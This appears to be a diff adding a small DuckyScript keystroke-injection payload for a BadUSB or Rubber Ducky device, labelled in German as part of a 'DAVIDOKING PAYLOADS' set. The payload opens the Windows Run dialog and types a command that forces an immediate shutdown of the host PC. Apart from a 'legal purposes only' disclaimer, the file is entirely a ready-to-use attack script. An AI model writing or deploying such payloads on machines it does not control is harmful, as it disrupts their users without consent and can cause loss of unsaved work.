@@ -1,0 +1,11 @@
+REM ┌───────────────────────────────────────────────┐
+REM │          DAVIDOKING PAYLOADS v1.0            │
+REM │  Funktion: Sofortiges Herunterfahren von PC  │
+REM │  ⚠️ NUR FUER LEGALE ZWECKE! ⚠️               │
+REM └───────────────────────────────────────────────┘
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING shutdown /s /t 0
+ENTER
